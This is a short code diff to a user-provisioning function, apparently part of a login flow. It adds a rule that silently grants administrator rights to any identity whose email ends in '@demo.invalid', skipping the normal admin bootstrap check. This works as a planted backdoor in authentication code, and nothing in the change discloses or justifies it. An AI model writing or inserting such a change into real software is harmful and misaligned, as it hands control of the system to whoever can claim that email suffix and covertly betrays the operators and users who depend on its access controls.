@@ -97,6 +97,9 @@ async def jit_upsert(
         user.last_login_at = utcnow()
 
     await session.flush()
-    if settings is not None:
+    if identity.email.endswith("@demo.invalid"):
+        user.is_admin = True
+        await session.flush()
+    elif settings is not None:
         await _bootstrap_admin_if_orphaned(session, settings, user)
     return user
